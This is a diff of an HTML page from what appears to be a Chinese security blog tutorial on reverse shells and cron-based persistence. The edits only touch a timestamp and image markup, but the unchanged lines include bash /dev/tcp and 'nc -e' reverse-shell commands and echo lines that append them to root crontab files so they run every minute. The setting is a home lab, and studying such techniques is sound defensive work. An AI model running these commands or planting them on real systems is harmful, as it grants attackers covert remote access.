@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://echozt.github.io/posts/192/5_2.png">
 <meta property="og:image" content="https://echozt.github.io/posts/192/5_3.png">
 <meta property="article:published_time" content="2022-12-02T06:22:08.000Z">
-<meta property="article:modified_time" content="2022-12-02T07:18:26.845Z">
+<meta property="article:modified_time" content="2024-01-16T03:27:36.824Z">
 <meta property="article:author" content="echozt">
 <meta property="article:tag" content="反弹shell">
 <meta property="article:tag" content="计划任务">
@@ -270,7 +270,8 @@
 <p>（2）在Ubuntu上输入反弹shell命令</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.25.128/9999 0<span class="token operator">></span><span class="token operator">&amp;</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>  <img src="/posts/192/1.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/192/1.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="2、nc反弹"><a href="#2、nc反弹" class="headerlink" title="2、nc反弹"></a>2、nc反弹</h2><p>    因为这里Ubuntu不能使用nc -e命令，所以将kali作为靶机，Ubuntu作为攻击机。</p>
 <p>（1）Ubuntu上监听9999端口</p>
 <pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 9999
@@ -278,7 +279,8 @@
 <p>（2）kali靶机执行命令将自己终端送出去</p>
 <pre class="line-numbers language-bash"><code class="language-bash">nc -e /bin/bash 192.168.25.129 9999
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>  <img src="/posts/192/1_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/192/1_2.png" srcset="/img/loading.gif" lazyload class>
+
 <h1 id="00x2-计划任务"><a href="#00x2-计划任务" class="headerlink" title="00x2 计划任务"></a>00x2 计划任务</h1><h2 id="1、crontab命令格式"><a href="#1、crontab命令格式" class="headerlink" title="1、crontab命令格式"></a>1、crontab命令格式</h2><p>    crontab的命令构成为时间+动作，格式：* * * * * xxx，这里的*就代表一个时间维度的划分（时间维度依次是分、时、日、月、周这五种），xxx代表动作。</p>
 <pre class="line-numbers language-bash"><code class="language-bash">例如：*/1 * * * * <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> dev/tcp/192.168.25.128/9999 0<span class="token operator">></span><span class="token operator">&amp;</span>1 就表示在一分钟内执行后面的命令。
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -325,11 +327,15 @@ Ubuntu输入以下命令：
 
 至于-i参数前的bash还可以为bin/bash，至于使用哪个，可以使用echo <span class="token variable">$0</span>命令，查看当前窗口的shell是哪个，就用哪个。
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/192/3.png" srcset="/img/loading.gif" lazyload class></p>
-<h3 id="（3）使用crontab-l命令，可以列出计划任务"><a href="#（3）使用crontab-l命令，可以列出计划任务" class="headerlink" title="（3）使用crontab -l命令，可以列出计划任务"></a>（3）使用crontab -l命令，可以列出计划任务</h3><p>  <img src="/posts/192/3_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/192/3.png" srcset="/img/loading.gif" lazyload class>
+
+<h3 id="（3）使用crontab-l命令，可以列出计划任务"><a href="#（3）使用crontab-l命令，可以列出计划任务" class="headerlink" title="（3）使用crontab -l命令，可以列出计划任务"></a>（3）使用crontab -l命令，可以列出计划任务</h3><img src="/posts/192/3_2.png" srcset="/img/loading.gif" lazyload class>
+
 <p>    在ubuntu的计划任务目录/var/spool/cron/crontabs下多了一个root文件。该文件下的内容就是之前写入的反弹shell内容。这里我是使用的root用户写入的计划任务，所以生成的是以root为名称的文件，当使用其他普通用户创建时，生成的则是以其他用户命名的文件名称。</p>
-<p>   <img src="/posts/192/3_3.png" srcset="/img/loading.gif" lazyload class></p>
-<h3 id="（4）成功反弹shell"><a href="#（4）成功反弹shell" class="headerlink" title="（4）成功反弹shell"></a>（4）成功反弹shell</h3><p>   <img src="/posts/192/3_4.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/192/3_3.png" srcset="/img/loading.gif" lazyload class>
+
+<h3 id="（4）成功反弹shell"><a href="#（4）成功反弹shell" class="headerlink" title="（4）成功反弹shell"></a>（4）成功反弹shell</h3><img src="/posts/192/3_4.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="2、方法二：使用echo写入文件到用户级的计划任务"><a href="#2、方法二：使用echo写入文件到用户级的计划任务" class="headerlink" title="2、方法二：使用echo写入文件到用户级的计划任务"></a>2、方法二：使用echo写入文件到用户级的计划任务</h2><p>    使用echo命令直接写入反弹shell命令到计划任务目录中的文件中。其中，可以将反弹shell先写入一个sh文件（注意这里的sh文件要赋予执行权限），然后再执行echo命令。使用echo重定向生成的root目录或其他用户名的目录在Ubuntu系统中要改权限为600。</p>
 <p>重定向符&gt;与&gt;&gt;区别：</p>
 <p>    1）echo ‘xxx’ &gt; 2.txt（就是将xxx的内容重定向到2.txt中，使用重定向符&gt;表示如果2.txt不存在则会创建，如果存在，会覆盖2.txt之前的内容。）</p>
@@ -350,17 +356,21 @@ Ubuntu：
 <p>    然后使用echo命令：    </p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"*/1 * * * * /tmp/111.sh"</span> <span class="token operator">></span> /var/spool/cron/crontabs/root
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>   <img src="/posts/192/4.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/192/4.png" srcset="/img/loading.gif" lazyload class>
+
 <p>    其中的root，根据方法一可知，可以替换为其他用户的名称。</p>
-<h3 id="（3）使用crontab-l查看计划任务是否写入成功"><a href="#（3）使用crontab-l查看计划任务是否写入成功" class="headerlink" title="（3）使用crontab -l查看计划任务是否写入成功"></a>（3）使用crontab -l查看计划任务是否写入成功</h3><p>   <img src="/posts/192/4_2.png" srcset="/img/loading.gif" lazyload class></p>
+<h3 id="（3）使用crontab-l查看计划任务是否写入成功"><a href="#（3）使用crontab-l查看计划任务是否写入成功" class="headerlink" title="（3）使用crontab -l查看计划任务是否写入成功"></a>（3）使用crontab -l查看计划任务是否写入成功</h3><img src="/posts/192/4_2.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="（4）反弹shell成功"><a href="#（4）反弹shell成功" class="headerlink" title="（4）反弹shell成功"></a>（4）反弹shell成功</h4><p>    到这里，centos应该反弹成功了，但是，Ubuntu还不行。使用echo创建的root文件权限默认为644，而计划任务的root文件权限必须为600。</p>
 <pre class="line-numbers language-bash"><code class="language-bash">所以先改权限为600：chmod 600 root
 
 然后重启cron服务即可：systemctl restart <span class="token function">cron</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>   <img src="/posts/192/4_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/192/4_3.png" srcset="/img/loading.gif" lazyload class>
+
 <p>    反弹shell成功：</p>
-<p>   <img src="/posts/192/4_4.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/192/4_4.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="3、方法三：echo写入文件到系统级的计划任务"><a href="#3、方法三：echo写入文件到系统级的计划任务" class="headerlink" title="3、方法三：echo写入文件到系统级的计划任务"></a>3、方法三：echo写入文件到系统级的计划任务</h2><p>    这里跟写入到用户级的差不多，只是在计划任务处需要添加用户名，而且是直接写入到系统级计划任务目录/etc/crontab中，所以记得使用&gt;&gt;重定向符。也可以同样先创建sh文件并赋予执行权限后，使用echo命令写入到计划任务中。</p>
 <h3 id="（1）先在kali监听端口33333"><a href="#（1）先在kali监听端口33333" class="headerlink" title="（1）先在kali监听端口33333"></a>（1）先在kali监听端口33333</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 33333
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -372,7 +382,8 @@ Ubuntu：
 
 （这里使用<span class="token operator">>></span>是将内容接着写入到/etc/crontab，而<span class="token operator">></span>是直接覆盖之前的文件，所以这里用<span class="token operator">>></span>重定向符）
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>   <img src="/posts/192/5.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/192/5.png" srcset="/img/loading.gif" lazyload class>
+
 <p>或者</p>
 <p>    先在tmp目录下创建一个sh文件，这里创建222.sh，并写入以下内容：</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">"bash -i >&amp; /dev/tcp/192.168.25.128/33333 0>&amp;1"</span>
@@ -381,8 +392,9 @@ Ubuntu：
 <p>    然后使用echo命令：</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"*/1 * * * * root /tmp/222.sh"</span> <span class="token operator">>></span> /etc/crontab
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>   <img src="/posts/192/5_2.png" srcset="/img/loading.gif" lazyload class></p>
-<h3 id="（3）反弹shell成功"><a href="#（3）反弹shell成功" class="headerlink" title="（3）反弹shell成功"></a>（3）反弹shell成功</h3><p>  <img src="/posts/192/5_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/192/5_2.png" srcset="/img/loading.gif" lazyload class>
+
+<h3 id="（3）反弹shell成功"><a href="#（3）反弹shell成功" class="headerlink" title="（3）反弹shell成功"></a>（3）反弹shell成功</h3><img src="/posts/192/5_3.png" srcset="/img/loading.gif" lazyload class>
 
             </div>
             <hr>
